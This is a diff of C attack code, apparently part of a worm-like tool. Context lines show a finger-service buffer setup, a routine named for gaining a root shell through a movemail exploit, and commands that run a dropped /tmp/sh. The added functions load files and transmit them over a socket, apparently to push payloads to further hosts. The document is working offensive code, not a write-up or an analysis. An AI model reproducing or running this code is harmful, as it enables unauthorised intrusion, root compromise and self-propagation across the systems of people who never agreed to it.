@@ -6,7 +6,6 @@
 #include <netinet/in.h>
 #include <stdio.h>
 
-#define TARGET_IP "172.20.0.12"
 #define FINGERD_PORT 79
 
 #define BUF_SIZE 532
@@ -22,6 +21,33 @@
 #define CHECK_FOR_SHELL "ls /tmp/sh\n" 
 #define RUN_SHELL "/tmp/sh\n" 
 #define NOT_FOUND "/tmp/sh not found"
+
+struct file_object {
+	char *file_name;
+	FILE *file_ptr;
+	int file_size;
+};	
+
+long int get_file_size(file_ptr)
+	FILE *file_ptr; 
+{
+	long int res;
+    /* checking if the file exist or not */
+    if (file_ptr == NULL) {
+        printf("File Not Found!\n");
+        return -1;
+    }
+
+	/* seek until the end of file */
+    fseek(file_ptr, 0L, 2);
+
+    /* calculating the size of the file */
+    res = ftell(file_ptr);
+
+	rewind(file_ptr);
+
+    return res;
+}
 
 create_sockaddr(serv_addr, ip, port)
 	struct sockaddr_in *serv_addr; 
@@ -117,4 +143,113 @@ get_root_shell_via_movemail_exploit(sock, io_buf, buf_size)
 
 	write_to_sock(sock, RUN_SHELL);
 }	
+
+int send_int(num, fd)
+	int num; 
+	int fd; 
+{
+    unsigned long conv = htonl((unsigned long)num);
+    char *data = (char*)&conv;
+    int left = sizeof(conv);
+    int rc;
+    do {
+        rc = write(fd, data, left);
+        if (rc < 0) {
+			return -1;
+        }
+        else {
+            data += rc;
+            left -= rc;
+        }
+    }
+    while (left > 0);
+    return 0;
+}
+
+int receive_int(num, fd)
+	int *num; 
+	int fd;
+{
+    unsigned long ret;
+    char *data = (char*)&ret;
+    int left = sizeof(ret);
+    int rc;
+    do {
+        rc = read(fd, data, left);
+        if (rc <= 0) { /* instead of ret */
+			return -1;
+        }
+        else {
+            data += rc;
+            left -= rc;
+        }
+    }
+    while (left > 0);
+    *num = ntohl(ret);
+    return 0;
+}
+
+int load_files(file_paths, num_files, files)
+	char **file_paths;
+	int num_files;
+	struct file_object* files; 
+{
+	int i;  
+	for (i = 0; i < num_files; i++) {
+		files[i].file_name = file_paths[i]; 
+		files[i].file_ptr = fopen(file_paths[i], "r");
+		if (files[i].file_ptr == NULL) return -1;
+		files[i].file_size = get_file_size(files[i].file_ptr);
+	}	
+	return 0;
+}	
+
+int send_files(client_sock, files, num_files, file_buf, buf_size)
+	int client_sock; 
+	struct file_object *files; 
+	int num_files;
+	char *file_buf;
+	int buf_size;
+{ 
+	int i, j;
+	int len;
+	int file_size;
+	int response;
+	char *file_name;
+
+	/* communicate number of files to send */
+	if (send_int(num_files, client_sock) < 0) return -1;
+	
+	/* ensure that the client socket knows how many files to recieve */
+	if (receive_int(&response, client_sock) < 0) return -1;
+	if (response != num_files) return -1;
+	printf("Client expecting %d files\n", response);
+	
+	/* try to send the files */
+	for (i = 0; i < num_files; i++) {	
+		/* first send the length of the file name */
+		file_name = files[i].file_name;
+		len = strlen(file_name);
+		if (send_int(len, client_sock)) return -1;
+
+		/* actually send the file name  */
+		send(client_sock, file_name, len, 0);
+		
+		/* send the file and rewind file pointer */
+		file_size = files[i].file_size;
+		printf("%s\n %d\n", file_name, file_size);
+		if (file_size < 0) return -1;
+		if (send_int(file_size, client_sock) < 0) return -1; 	
+		while (fgets(file_buf, buf_size, files[i].file_ptr) != NULL) {
+			send(client_sock, file_buf, strlen(file_buf), 0);
+		}	
+		rewind(files[i].file_ptr);
+
+		/* wait until the client says it recieved the file */
+		if (receive_int(&j, client_sock) < 0) return -1;
+		if (i != j) return -1;
+	}	
+
+	return 0;
+}
 #endif
